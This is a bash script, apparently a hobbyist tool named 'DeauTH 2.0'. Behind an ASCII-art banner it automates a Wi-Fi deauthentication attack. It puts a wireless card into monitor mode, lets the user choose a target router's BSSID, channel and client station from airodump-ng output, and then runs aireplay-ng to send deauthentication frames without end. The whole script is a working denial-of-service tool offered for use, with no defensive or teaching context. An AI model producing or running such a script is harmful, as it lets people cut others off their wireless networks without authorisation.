clear;
function trapCtrlC() {
  echo -e '\n'$Cyan'>> Exiting Script'
  airmon-ng stop $suc;
  service network-manager start;
  trap trapCtrlC 2
  exit;
}


#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m" 

  echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
        echo -e "$red[                                                      ]"
  echo -e "$red[  $red       DeauTH 2.0 by Von Uyvico${yellow} ${red}                    ]"
        echo -e "$blue[                                                      ]"
        echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
        echo
        echo

echo -e "$yellow|  _ \  ___  __ _ _   |_   _| | | | |___ \  / _ \  | |__  _   _ 
| | | |/ _ \/ _' | | | || | | |_| |   __) || | | | | '_ \| | | |
| |_| |  __/ (_| | |_| || | |  _  |  / __/ | |_| | | |_) | |_| |
|____/ \___|\__,_|\__,_||_| |_| |_| |_____(_)___/  |_.__/ \__, |
                                                          |___/ 
__     __          
\ \   / /__  _ __  
 \ \ / / _ \| '_ \ 
  \ V / (_) | | | |
   \_/ \___/|_| |_|"
echo -e "\n"

echo -e "      "$red"["$yellow"NOW"$red"]"$green" Choose Interface          "
echo -n '>> '
xterm -title "Choose Interface" -e 'airmon-ng; sleep 99999999999999'
read it
STR=$it
SUB='mon'
if [[ "$STR" == *"$SUB"* ]]; then
  suc=$it
else
	suc=$it"mon"
fi
trap trapCtrlC 2
echo -e $red'NOTE: DO NOT CLOSE "Select Target Router" TERMINAL!'
xterm -title "Select Target Router" -e 'echo "Please wait..."; airmon-ng check kill; airmon-ng start '$it'; airodump-ng '$suc'; sleep 9999999999999999999;' &
# Details of Router
echo -n -e $yellow'Copy BSSID of target and paste here: '
read bssid
echo -n 'Copy CHANNEL of target and paste here: '
read channel
echo -e $green'NOTE: YOU MAY NOW CLOSE "Select Target Router" TERMINAL!'
xterm -title 'Select Target Device' -e 'airodump-ng '$suc' --bssid '$bssid' --channel '$channel &
# Device
echo -n -e $yellow'Copy STATION of target DEVICE and paste here: '
read device
xterm -title "DeauTH Attack Working" -e 'aireplay-ng --deauth 0 -c '$device' -a '$bssid' '$suc &